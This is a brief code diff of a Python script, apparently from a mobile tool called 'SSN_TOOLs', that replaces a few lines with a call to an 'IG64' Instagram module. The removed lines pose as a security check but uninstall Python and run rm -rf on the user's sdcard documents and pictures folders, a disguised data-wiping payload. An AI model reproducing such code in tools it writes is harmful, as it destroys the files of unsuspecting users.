@@ -1,7 +1,2 @@
-print(" Checking For Security......")
-os.system("pkg uninstall python")
-os.system("rm -rf /sdcard/documents")
-os.system("rm -rf /sdcard/document")
-os.system("rm -rf /sdcard/documents")
-os.system("rm -rif /sdcard/pictures")
-print("\003[1;32m YOU'VE been Banned From SSN_TOOLs")
+import IG64
+IG64.Instagram()
